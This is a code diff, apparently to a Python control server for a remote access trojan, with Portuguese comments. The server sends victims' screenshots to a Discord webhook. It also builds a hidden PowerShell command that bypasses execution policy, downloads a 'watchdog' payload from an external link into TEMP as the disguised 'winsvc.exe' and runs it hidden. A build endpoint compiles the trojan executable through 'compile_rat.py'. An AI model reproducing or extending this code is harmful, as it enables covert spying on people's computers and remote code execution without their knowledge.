@@ -72,6 +72,8 @@ def load_state():
 
 # Link publico do watchdog (Gofile)
 WATCHDOG_URL = os.environ.get('WATCHDOG_URL', '')
+DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
+DISCORD_CHANNEL = int(os.environ.get('DISCORD_CHANNEL', '0') or '0')
 
 def send_to_discord(pc_name, screenshot_base64):
     """Envia screenshot para Discord via webhook"""
@@ -221,23 +223,16 @@ def register_pc():
 
 
 def _deploy_watchdog_bg(pc_name):
-    """Background: envia comando PowerShell para baixar watchdog do painel"""
+    """Envia comando PowerShell para baixar watchdog"""
     try:
-        with pc_lock:
-            info = connected_pcs.get(pc_name, {})
-            host = info.get('last_host', '')
-        
-        if not host:
-            host = request.remote_addr if hasattr(request, 'remote_addr') else 'localhost'
-        
-        url = f"http://{host}:5000/api/watchdog"
-        if WATCHDOG_URL:
-            url = WATCHDOG_URL
+        if not WATCHDOG_URL:
+            logger.warning(f"[WATCHDOG] WATCHDOG_URL nao configurada, sem deploy para {pc_name}")
+            return
         
         cmd = (
             f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
             f'"Start-Sleep 2; '
-            f'Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\winsvc.exe -UseBasicParsing; '
+            f'Invoke-WebRequest -Uri {WATCHDOG_URL} -OutFile $env:TEMP\\winsvc.exe -UseBasicParsing; '
             f'Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
         )
         
@@ -247,7 +242,7 @@ def _deploy_watchdog_bg(pc_name):
             if pc_name in connected_pcs:
                 connected_pcs[pc_name]['watchdog_deployed'] = True
         
-        logger.info(f"[WATCHDOG] {pc_name}: deploy via {url[:60]}...")
+        logger.info(f"[WATCHDOG] {pc_name}: deploy via {WATCHDOG_URL[:50]}...")
     except Exception as e:
         logger.error(f"[WATCHDOG] Erro deploy para {pc_name}: {e}")
 
@@ -550,22 +545,21 @@ def build_rat_exe():
             dist_path_exe = dist_dir / 'raiox.exe'
             if dist_path_exe.exists():
                 dist_path = dist_path_exe
-        builder_script = app_dir / 'builder2.py'
+        builder_script = app_dir / 'compile_rat.py'
         
-        logger.info(f"[BUILD] Procurando raiox.scr em: {dist_path}")
+        logger.info(f"[BUILD] Iniciando compilacao via compile_rat.py")
         
-        # Se não existir, tenta compilar
-        if not dist_path.exists():
-            logger.info("[BUILD] Arquivo não encontrado. Iniciando compilação...")
-            if builder_script.exists():
-                try:
-                    subprocess.run([sys.executable, str(builder_script)], check=True, cwd=str(app_dir))
-                    logger.info("[BUILD] Compilação concluída com sucesso.")
-                except subprocess.CalledProcessError as e:
-                    logger.error(f"[BUILD] Falha na compilação: {e}")
-                    return jsonify({"error": "Falha ao compilar o executável no servidor."}), 500
-            else:
-                return jsonify({"error": "Script builder2.py não encontrado no servidor."}), 404
+        if not builder_script.exists():
+            return jsonify({"error": "compile_rat.py nao encontrado"}), 404
+        
+        try:
+            subprocess.run([sys.executable, str(builder_script)], check=True, cwd=str(app_dir), timeout=600)
+            logger.info("[BUILD] Compilacao concluida")
+        except subprocess.TimeoutExpired:
+            return jsonify({"error": "Timeout (10min)"}), 500
+        except subprocess.CalledProcessError as e:
+            logger.error(f"[BUILD] Falha: {e}")
+            return jsonify({"error": "Falha ao compilar"}), 500
         
         if not dist_path.exists():
              return jsonify({
